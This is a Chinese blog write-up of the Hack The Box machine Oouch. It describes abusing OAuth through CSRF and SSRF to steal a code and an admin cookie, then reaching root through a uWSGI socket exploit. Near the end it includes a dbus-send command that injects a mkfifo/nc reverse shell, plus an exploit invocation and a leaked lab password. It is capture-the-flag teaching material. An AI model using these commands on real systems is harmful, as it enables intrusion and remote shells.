> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qFjLBe_3B5rI-P5XAbjYSg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **194** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_gif/ldWFh337rbjfApaRGicR1GGwHDCYPhsKZ9euLodKu0upoCBupGzffThUrZlyL2I0qu4OzmzGg3YQ4JPhJ2UZ18A/640?wx_fmt=gif)

靶机地址：https://www.hackthebox.eu/home/machines/profile/231

靶机难度：高级（4.9/10）

靶机发布日期：2020 年 7 月 27 日

靶机描述：

Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ibQV91UPVPA0YraLBxG6SF7hBIMGETWZCPmdut5HSvsfqQz6CtfmOScRtJFM8gtn5LKRiav4DhT1Cxk6YPiaEHZvQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/dphnm0BKfwKLtib9vQ1APuIAKeJtunpQ9t0U2bFm604pdiagpiavfaicU0LSsYk60Ugh838nnFVzywH0z19gB2VMOQ/640?wx_fmt=gif)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/7phYCjicsxExcHT6Dnz0PPkUycARhia5vV64je93lrrZSxlz64jyGCuicicUC0jAZx4rsG4qsfMwymvib1zwhibQRdaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3DxGYGwDRued4aut2DN9OVibqHpEIc1TgBKY5eNbNZLucQ3a1gTTpicbw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.177...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3icIYScBsaLouZgBialFA0BibU1ljaZFbM8mjfa2VmhBJRM4vSL4tv2PgA/640?wx_fmt=png)

我这里利用 Masscan 快速的扫描出了 21,22,5000,8000 端口，在利用 nmap 详细的扫描了这些端口情况...

没什么特别突出的，看图即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3kIPzjEEzoYmmOEWsk0PdxWo7FlM9WDNicJZesSzyO14utGGNn3bXdlQ/640?wx_fmt=png)

下载 FTP 里的所有内容... 发现 project 文本信息...

该文本包含的信息不多，但它为我们提供了两个术语：Consumer 和 Authorization Server....

Google 发现这是和 OAuth 相关联的术语.... 有意思了

下面我是通过了三次，理解了 OAuth 原理才开始写的这文章，希望学习的小伙伴阅读下以下文章，很有用对于 OAuth 认知

```
https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/
https://docs.oracle.com/cn/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm
https://docs.microsoft.com/zh-cn/azure/active-directory/develop/v2-oauth2-auth-code-flow
https://github.com/topavankumarj/Vulnerable-OAuth2.0-Application
```

开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n37RIzdUIbyxpv9hibjaHdnlfpemCoaEsDdcw3BJuXYCul8ChjJSosPoQ/640?wx_fmt=png)

5000 端口是个登录表单页面... 还有创建用户选项...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n30N5iaibFCcSwibLsggXwS5LDm7pSzibgUVYrictumv5TekFamjou5eNHIhw/640?wx_fmt=png)

创建了用户名密码：

```
dayu123/123
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3l8MvnoFB3WfwV1lwjKobxtJ2RUURvDGnyK4ezXY5CrZRc8wYdU7sjw/640?wx_fmt=png)

主要信息... 允许将消息转发给系统管理员....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3xJfVI7bsv3xNQVu8FWPApervSRxkv3YaDibqR75tAQAV9IFTG7pT4jQ/640?wx_fmt=png)

在 / profile 网站上提到了 Connected-Accounts，可以将帐户连接到此服务上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3vffHThy0pfU8RXA46P0rfRydOGq3fBl6agLV8F2TxRqStWAV31GUCw/640?wx_fmt=png)

在 / Contact 存在 SSRF... 在其中可以向管理员发送信息对称到了前面获得的信息内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n35yic2InDEia1YfBE12tCH958ibfy3vyhYXiaUqBZH2Sv1OkUibfO5KLWjXw/640?wx_fmt=png)

简单爆破获得了 / oauth 有效目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3ibxgjqPQ5b8ylq5WaSzvcFsS5PJ66qbZTnEpf19ZxJQKRs5ya1lQoLg/640?wx_fmt=png)

内容提到了要连接的页面和已连接后的页面... 一个一个分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3mNAOSyQjoE7OWwomBpjCo8wiaJx4mTvdZfwvib8RQhIgM2ChMuCeRctw/640?wx_fmt=png)

利用 burpsuit 拦截 connect 页面，发现跳转到的 host 为 authorization.oouch.htb:8000，将域名添加到 hosts 中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3UItNefDFyKjiaBSNtNIU4LWwKhLA0oC6qtic62C8vQadsEib7h0AjtDdg/640?wx_fmt=png)

重新访问跳转到了登录页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3ovTKNOYn7JaeBXQ88FKofmUcHicvIrfNQibWqPGHhVgGlTlrPaWIiaoXA/640?wx_fmt=png)

访问 http://authorization.oouch.htb:8000 / 发现这是 OAuth 2.0....

OAuth 2.0 是行业标准授权协议，OAuth 2.0 致力于简化客户端开发人员的工作，同时为 Web 应用程序，桌面应用程序，移动电话和客厅设备提供特定的授权流程... 开头文章也有介绍了....

所以这里会话是通过令牌管理的，接下来需要找到一种从管理员那里获取令牌的方法...

还提示可获得 SSH...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3Cpiaw8MHkhBHYTyjg6Cia3xVtfLudolFxaf5I0tpNwZmUmnicYH8TkLJQ/640?wx_fmt=png)

再次创建另一个用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n34qujh2dBx3Q8ssyDuUIIkYIyoZcKpKgial3WXicVVs9wKs86nWiaGMBhA/640?wx_fmt=png)

访问 http://consumer.oouch.htb:5000/oauth 接着跳转到存在 Authorize 授权页面... 抓包分析

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3XRCiaiafmPiaqJhQbuwFK7y760vfolXuA3PRV2BQEZ8vqMGMwbA7SpYgA/640?wx_fmt=png)

点击 Authorize 后 burpsuit 查看获得了 oauth 令牌代码：/oauth/connect/token?code=BAEL3vfw93DUgEud3zXmmPPzz5Pgab

此刻已经获得了令牌，这里就可以通过 SSRF 写入了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3tPl3PENicYU9UZicdO5XNNO9VCuXW6sPT4y0icIOA7xwdIQeTicoRjxmRw/640?wx_fmt=png)

No Accounts Connected.... 这里要保持此状态，如果 dayu123 用户状态的话，无法进行，详细查看下文章的一些结构哦.

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3NayNibCC7HicxgnXCR3oRrVjvFD2TYVXCGq4tP2ksyPVIxY9mZ3eraCg/640?wx_fmt=png)

通过获得的令牌 Send 后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3HDmZib3iaujqjEJElT2XlCT1PVr9LBzNuhrrdYTIDwDxyWP9RqvSlulw/640?wx_fmt=png)

然后回到 http://consumer.oouch.htb:5000/oauth/login 点击授权 Authorized，查看 Profile 状态通过两个用户间漏洞登录进了 qtc 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3jsiaBgppqewTO9UJBzuNibJqRymicdHa8p1xl9NclwCSgRrDdSHguTThg/640?wx_fmt=png)

查看 Documents 后发现：

用户名密码：develop:supermegasecureklarabubu123!

存在 API 端点：/api/get_user

可以获得 qtc 的 ssh 密匙...

这里需要枚举出 oauth 的登录页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3QsqzB9WulqWBVib1Dez2IV8wC2hhV3wp4Zh4tOEKQqGVGfiaJMrDTOBQ/640?wx_fmt=png)

```
gobuster dir -u http://authorization.oouch.htb:8000/oauth/ -w /usr/share/wordlists/dirb/common.txt
```

枚举出 application，发现 develop 用户无法登录... 是个假页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3F0vfB40lDZ12RXPVEpR0XtsqhoXa2ofXyFCreic4WZH7BGjj6cqASYQ/640?wx_fmt=png)

```
gobuster dir -u http://authorization.oouch.htb:8000/oauth/applications/ -w /usr/share/wordlists/dirb/common.txt
```

继续在 application 目录下继续爆破... 过一段时间获得了 register 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3LJhWOkib9bdw9onIGCThogB0cdFXEp0ica50cSFknfVThDaoddKVqOUw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3LJhWOkib9bdw9onIGCThogB0cdFXEp0ica50cSFknfVThDaoddKVqOUw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3LJhWOkib9bdw9onIGCThogB0cdFXEp0ica50cSFknfVThDaoddKVqOUw/640?wx_fmt=png)

登录即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3vphXpBQbhCIhfLAeUSYxOdkAFsUiaub5eBGO4vuIZrYhfYBNn4XM3yA/640?wx_fmt=png)

登录后该页面是注册一个应用程序的页面...

理下思路：

```
1、我利用develop进入了注册页面...
2、需要找到/api/get_userAPI并使用它来获取用户数据...
3、提示/oauth/authorize，该方法在OAuth文章中提示POST请求，现在支持GET，应该是属于POST链接进行访问获取..
4、最终会找到qtc的SSH密钥，将使用它来获取shell...
```

开始.... 注册了 authorization code，url 填写本地 kali 端口和 IP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3vmq3ouIoyHc1vsRtFibIRvUBb37UJ82nJnQicooeCr4FxRFLxBP7krBg/640?wx_fmt=png)

成功创建，获得 Client id 和 Client type 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3Mnwb4Zz4w81ItibJjVzNKFHSEF4R0FLDPSKY2t3us3AzTu8MkjpfeicA/640?wx_fmt=png)

```
https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow
```

该文章前面也贴过链接了，这里在提示下...

开始利用把... 文章讲得很详细了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3Sib9lsbCqDbyw0UVlRxURqXEEuVSTlusufb17QD9ZOGWCbBLvfRLw4g/640?wx_fmt=png)

```
http://authorization.oouch.htb:8000/oauth/authorize?client_id=e31ocSko9m7bkplpOTuDYkAp4gOB7lkH44xOE3Sn&client_secret= QKbOgjiR2FFc8yINVt3kqjLSxM2dEcaI5U4L9rYGUUQFQhSJn3cQhKBS2AnsCJ6KWe7su2E46CYx7RLyINu4GM6e4fzFpAweG2vzt4Q6bdx5pFlEYtCOQEu4MTsXwHAD&response_type=code&redirect_uri=http://10.10.14.12:80/&grant_type=authorization_code
```

访问点击 Authorize，在本地 NC 中成功返回了需要的值... 非常好

下一步就是利用 SSRF 从授权子域中窃取 QTC 的 Cookie...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n39UtZlrdXt5qSw4mpsRVoe0LVdxTtMaJGMAqvxyBROVY1RzdpZWVp3A/640?wx_fmt=png)

通过测试有一个正常工作的 appurl，它将 req 重定向到我的本地端口 80，可以使用 SSRF 执行该请求，并且请求返回到我的终端，就可以获得登录的管理员帐户的 cookie...

发送了链接，并在终端上得到了 cookie....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3Bg6pCgxA1SeiazYyNwibiaHmKNOicXpTC8gS3ibQsXqLI0OQpNIPEpVicqPQ/640?wx_fmt=png)

然后修改 cookie 即可...（这里可以下载 cookie Editor 或者在调试器中更改即可)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3QSyuP53VSfKcnMlLBtIg584aj9M3PnhDNL5VgAqLsWdEVPnHauHUhw/640?wx_fmt=png)

重新刷新页面，通过 qtc 的 cookie 成功进入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3MRMsgSlAuM2Ayk1DibuzAEzdsuxoGiat2TmYhribltFPFiccib81Z2lxH2g/640?wx_fmt=png)

```
https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/
```

下一步利用该文章方法进行获取 QTC 令牌值....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n30HWTSAZejpSiaZbEtyfUFMzBYHDibkn1xGujGicFr6jMk2kzKnsHc8P5g/640?wx_fmt=png)

http://authorization.oouch.htb:8000/oauth/applications/4/  --- 记住前面注册的 URL 是 4...

如果登录到 authorization.oouch.htb:8000，看到 / oauth/token 提到了端点，并且文章也对此进行了讨论，并且如果更改应用程序以 Client credentials 模式（目前是 authorization code 模式）代替使用，Authorization code 我可以得到的令牌代码实际上是 qtc 的令牌，因为目前在 authorization 域上以 qtc 身份登录的...

所以这里需要利用 Client credentials 模式获取令牌值...

返回创建下即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3PsRNGib4ywFO2eNp9kDHnsibsib9g2CjRpQyNccHJGNHgtcQCmbayCKTg/640?wx_fmt=png)

这里利用 burpsuit 进行 POST，首先创建好 Client credentials 模式信息后重新生成 Client id 和 Client type 值，将 Client credentials 模式值安装文章 EXP 进行写入即可...

可看图，成功获得了 access_token 令牌值....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3qspbs73bLNyT5RB7GZkqKoO5qwIafU7BkicwQp5H5kN8BobGMpY0QmA/640?wx_fmt=png)

通过注册获得了令牌值后，API 就可以读取了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3iaicJI5EeqrjHH3rs206mHH4y1Q0YwwazcPmZiaaTUXwI5H8Yy13RfEJQ/640?wx_fmt=png)

读取后，直接 user 修改为 ssh 获得了 id_rsa 密匙凭证... 这里存在 \ n 替换即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n32F1S4Ucr4oQNymDEkgfZ9I8Ogl3QwaKDEnbqTGBsr2LcqiaoVEtQaAQ/640?wx_fmt=png)

有了 ssh 登录密匙，成功登录 qtc 界面，并获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3pbA7rgOqxTEGLxdMydxEFKoPROWnBH03GqVXNTZGE1UxbALdKmibobQ/640?wx_fmt=png)

https://www.freedesktop.org/wiki/Software/dbus/     -- 什么是 DBus

这里认真仔细的阅读下... 后期提权很有用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3wzAE233uPEx9LzQP9JJic9NaEf95HBSx9bZKMW2FpMDq998BpzfVDcw/640?wx_fmt=png)

阅读有关 DBus 的内容后，查看文件中配置了各种应用程序的 / etc/dbus-1/system.d...

Oouch 上存在五个配置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n35QkTPaicObO1Vkic4ibsNUXNK4M8ynwp3Z5k7iaJMSEBBcCicPlPATXRecA/640?wx_fmt=png)

此配置文件将应用程序的所有者定义为 root，这意味着此应用程序产生的所有进程也将以 root 身份运行，该配置还允许 www 数据用户向其发送和接收数据...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3iaFp4GxKa5knrJhJMlTlbYzObGo8ls78ZDQv8V7j0IdeUFlsSoWujRw/640?wx_fmt=png)

查看了该靶机 IP 地址：172.18.0.1

快速 ping 扫描，以查看该子网上有哪些主机...

可看到存在 1~5 台机器... 我这里利用 nmap 发现了 1 和 4 都是正常设备开放了 22 端口，2、3 是数据库... 开放了 3306 端口..

```
https://github.com/yunchih/static-binaries   --下载nc、nmap等工具...
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3PxicBE06HzABEAkGQLRdicsIaWibFPdN6Nd9GAXqpafaHfKOc4ibPOyzGQ/640?wx_fmt=png)

尝试用 ssh 测试登录，发现 1 和 4 的 IP 是同一个 key.... 登录后在 code 目录下发现了很多配置...

其中描述出了 / tmp/uwsgi.socket 文件信息... 这存在漏洞利用的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3UvD1CXdNVH0vxFibFqCA53E4sibKQmvmFfGcM8Db7S03cEZjKuUA3Vug/640?wx_fmt=png)

直接 google 找 EXP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n34NDYouTticqoUczTwABJpY13Hswn5CSjbwbvBmB2vWesfD99ibYb1x5w/640?wx_fmt=png)

```
https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py
```

利用 google 搜索的 EXP，下载并上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3jFbOj0f4oBhhIVQXKaZyWo4K0C8vw7lUJSscaYicNO7olUibmkco9Q2A/640?wx_fmt=png)

运行后发现代码错误需要简单修改下 EXP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3jla58wcibpFMo8oXEtD6XSG5NAnevZgAk9gvoG8ooXOAsUUU8RXzdZA/640?wx_fmt=png)

删除掉红框中的代码即可...

重新上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n36tkqXjHoHgMkibHEzlDia4sOHnV9CImRNe1pibQ1vHOCqhtfsRe1pDRSA/640?wx_fmt=png)

```
python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c 'python /tmp/dayushell.py'
```

这里由于下载 github 太慢了... 放弃等待 NC 了，利用简单的 shell 提权外壳吧...

上传后执行即可... 获得了 www 低权外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3wzK2hCt066vNKT6tMqibWx3ibhzTVyYAeWhkD0pX3ATxnCnlJahicu61Q/640?wx_fmt=png)

```
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block "string:;rm /tmp/.hackpipe; mkfifo /tmp/.hackpipe; cat /tmp/.hackpipe | /bin/bash -i 2>&1 | nc 172.18.0.1 6666 >/tmp/.hackpipe;"
```

这里阅读过 D-Bus 就知道，有直接提权的方法...

直接利用本地 nc 上传后，qtc 本地提权即可... 获得了 root 权限和 root_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibnflpzxicM41jicjuUs78n3mgjGVyN5G3dnic6DicibmMQEP57L0h4wlic7rpB1z1b5DCJLLI6RdjceGg/640?wx_fmt=png)

这里还没结束，我枚举了下，发现应该还不止一种方法能在 www 低权下获得  

![](https://mmbiz.qpic.cn/mmbiz_gif/ldWFh337rbjfApaRGicR1GGwHDCYPhsKZ9euLodKu0upoCBupGzffThUrZlyL2I0qu4OzmzGg3YQ4JPhJ2UZ18A/640?wx_fmt=gif)

root 权限... 可利用 python 写 shell 提权...

最近时间很紧，我就不写下去了... 思路把感兴趣的可以研究...

需要深入理解 Aauth 原理协议架构等信息才能拿到 QTC 的 SSH 密匙...

然后深入理解 D-Bus 提权利用漏洞原理... 可以获得 root 权限...

学习了... 加油！

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)